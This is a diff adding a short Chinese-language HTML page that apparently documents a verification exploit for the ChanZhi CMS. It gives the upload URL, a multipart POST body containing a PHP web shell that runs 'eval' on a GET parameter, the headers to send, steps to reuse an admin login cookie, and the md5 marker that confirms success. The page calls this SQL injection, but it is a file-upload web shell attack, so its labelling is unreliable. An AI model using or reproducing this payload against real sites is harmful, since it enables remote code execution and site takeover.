@@ -1,0 +1,23 @@
+<meta charset="UTF-8">
+<div>
+    <h3>SQL注入URL: </h3>
+    <code>http://example.com/chanzhi/system/tmp/package/php.php</code>
+    <h3>POST-DATA: </h3>
+    <pre><code>------WebKitFormBoundaryGgFOYWAluy1F8lvn
+Content-Disposition: form-data; name="file"; filename="php.php"
+Content-Type: text/php
+
+&lt;?php echo md5(c);@eval($_GET['c']);>
+------WebKitFormBoundaryGgFOYWAluy1F8lvn--</code></pre>
+    <p>修改添加或修改请求头参数为</p>
+    <pre><code>Accept:application/json, text/javascript, */*; q=0.01
+Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryGgFOYWAluy1F8lvn
+Accept-Language:zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4</code></pre>
+    <h3>验证过程</h3>
+    <p>先登录后台</p>
+    <code>http://example.com/chanzhi/admin.php?m=package&f=upload</code>
+    <p>取出登录后的cookie</p>
+    <p>利用(SQL注入URL+POST-DATA+取出的cookie值)构造请求</p>
+    <h3>返回结果</h3>
+    <p>查看返回页面源码中是否有字符：4a8a08f09d37b73795649038408b5f33</p>
+</div>
